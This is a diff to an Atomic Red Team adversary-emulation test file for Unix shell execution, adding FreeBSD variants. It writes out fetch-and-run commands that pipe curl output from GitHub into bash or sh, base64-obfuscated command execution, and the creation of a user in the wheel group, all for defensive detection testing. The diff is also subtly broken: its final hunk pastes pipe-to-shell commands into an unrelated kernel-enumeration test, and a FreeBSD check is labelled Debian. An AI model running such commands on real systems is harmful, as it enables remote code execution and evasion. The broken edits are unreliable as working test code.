@@ -4,10 +4,11 @@ atomic_tests:
 - name: Create and Execute Bash Shell Script
   auto_generated_guid: 7e7ac3ed-f795-4fa5-b711-09d6fbe9b873
   description: |
-    Creates and executes a simple bash script.
+    Creates and executes a simple sh script.
   supported_platforms:
-  - macos
+  - freebsd
   - linux
+  - macos
   input_arguments:
     script_path:
       description: Script path
@@ -29,8 +30,9 @@ atomic_tests:
 
     Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
   supported_platforms:
-  - macos
+  - freebsd
   - linux
+  - macos
   executor:
     command: |
       curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
@@ -103,6 +105,7 @@ atomic_tests:
   description: |
     An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.
   supported_platforms:
+  - freebsd
   - linux
   executor:
     name: sh
@@ -119,6 +122,7 @@ atomic_tests:
   description: |
     An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.
   supported_platforms:
+  - freebsd
   - linux
   executor:
     name: sh
@@ -132,6 +136,7 @@ atomic_tests:
   description: |
     An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.
   supported_platforms:
+  - freebsd
   - linux
   executor:
     name: sh
@@ -143,6 +148,7 @@ atomic_tests:
   description: |
     An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!
   supported_platforms:
+  - freebsd
   - linux
   executor:
     name: sh
@@ -162,12 +168,26 @@ atomic_tests:
       echo "\$ART=$ART"
       echo -n "$ART" |base64 -d |/bin/bash
       unset ART 
+- name: Obfuscated command line scripts (freebsd)
+  auto_generated_guid: 5dc1d9dd-f396-4420-b985-32b1c4f79062
+  description: |
+    An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.
+  supported_platforms:
+  - freebsd
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      ART=$(echo -n "id" |b64encode -r -)
+      echo "\$ART=$ART"
+      echo -n "$ART" |b64decode -r |/bin/sh
+      unset ART
 - name: Change login shell
   auto_generated_guid: c7ac59cb-13cc-4622-81dc-6d2fee9bfac7
   description: |
     An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. 
   supported_platforms:
-    - linux
+  - linux
   dependencies:
   - description: |
       chsh - change login shell, must be installed
@@ -185,12 +205,35 @@ atomic_tests:
       cat /etc/passwd |grep ^art
     cleanup_command: | 
       userdel art
+- name: Change login shell (freebsd)
+  auto_generated_guid: 33b68b9b-4988-4caf-9600-31b7bf04227c
+  description: |
+    An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/sh shell, changes the users shell to sh, then deletes the art user. 
+  supported_platforms:
+  - freebsd
+  dependencies:
+  - description: |
+      chsh - change login shell, must be installed
+    prereq_command: |
+      if [ -f /usr/bin/chsh ]; then echo "exit 0"; else echo "exit 1"; exit 1; fi
+    get_prereq_command: |
+      echo "Automated installer not implemented yet, please install chsh manually"
+  executor:
+    name: sh
+    elevation_required: true 
+    command: |      
+      pw useradd art -g wheel -s /bin/csh
+      cat /etc/passwd |grep ^art
+      chsh -s /bin/sh art
+      cat /etc/passwd |grep ^art
+    cleanup_command: | 
+      rmuser -y art
 - name: Environment variable scripts
   auto_generated_guid: bdaebd56-368b-4970-a523-f905ff4a8a51
   description: |
     An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash
   supported_platforms:
-    - linux
+  - linux
   executor:
     name: bash
     elevation_required: false 
@@ -199,6 +242,21 @@ atomic_tests:
       echo $ART |/bin/bash
     cleanup_command: | 
       unset ART
+- name: Environment variable scripts (freebsd)
+  auto_generated_guid: 663b205d-2121-48a3-a6f9-8c9d4d87dfee
+  description: |
+    An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/sh
+  supported_platforms:
+  - freebsd
+  executor:
+    name: sh
+    elevation_required: false 
+    command: |
+      export ART='echo "Atomic Red Team was here... T1059.004"'
+      echo $ART |/bin/sh
+    cleanup_command: | 
+      unset ART
+
 - name: Detecting pipe-to-shell
   auto_generated_guid: fca246a8-a585-4f28-a2df-6495973976a1
   description: |
@@ -230,6 +288,37 @@ atomic_tests:
       ls -la /tmp/art.txt      
     cleanup_command: |
       rm /tmp/art.txt
+- name: Detecting pipe-to-shell (freebsd)
+  auto_generated_guid: 1a06b1ec-0cca-49db-a222-3ebb6ef25632
+  description: |
+    An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
+  supported_platforms:
+  - freebsd
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      Check if running on a Debian based machine.
+    prereq_command: |
+      if grep -iq "FreeBSD" /etc/os-release; then echo "FreeBSD"; else echo "NOT FreeBSD"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      pkg update && pkg install -y curl
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      cd /tmp
+      curl -s #{remote_url}
+      ls -la /tmp/art.txt
+      curl -s #{remote_url} |bash
+      ls -la /tmp/art.txt      
+    cleanup_command: |
+      rm /tmp/art.txt      
 - name: Current kernel information enumeration
   auto_generated_guid: 3a53734a-9e26-4f4b-ad15-059e767f5f14
   description: |
@@ -240,4 +329,11 @@ atomic_tests:
     name: sh
     elevation_required: false
     command: |
+      cd /tmp
+      curl -s #{remote_url}
+      ls -la /tmp/art.txt
+      curl -s #{remote_url} |sh
+      ls -la /tmp/art.txt      
+    cleanup_command: |
+      rm /tmp/art.txt
       uname -srm
